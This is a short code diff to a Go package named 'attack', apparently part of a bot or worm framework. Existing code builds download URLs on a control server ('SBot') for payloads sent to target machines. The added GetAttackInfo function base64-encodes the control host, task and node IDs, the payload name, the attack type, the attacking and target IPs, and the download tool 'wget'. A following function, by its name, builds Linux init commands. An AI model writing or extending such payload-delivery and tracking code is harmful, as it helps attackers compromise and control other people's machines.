@@ -1,6 +1,7 @@
 package attack
 
 import (
+	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"github.com/cbot/targets/local"
@@ -166,6 +167,14 @@ func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackTy
 
 	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))
 
+}
+
+func (at *AttackTasks) GetAttackInfo(targetIP string, targetPort int, attackType string, fname string) string {
+
+	s := fmt.Sprintf("%s,%d,%s,%s,%s,%s,%d,%d,%d,%s", at.Cfg.SBotHost,at.Cfg.SBotPort,at.Cfg.TaskId, at.Cfg.NodeId,
+		fname, attackType, netutils.IPStrToInt(at.nodeInfo.IP), netutils.IPStrToInt(targetIP), targetPort, "wget")
+
+	return base64.StdEncoding.EncodeToString([]byte(s))
 }
 
 func (at *AttackTasks) InitCmdForLinux(initUrl string,attackType string) string {
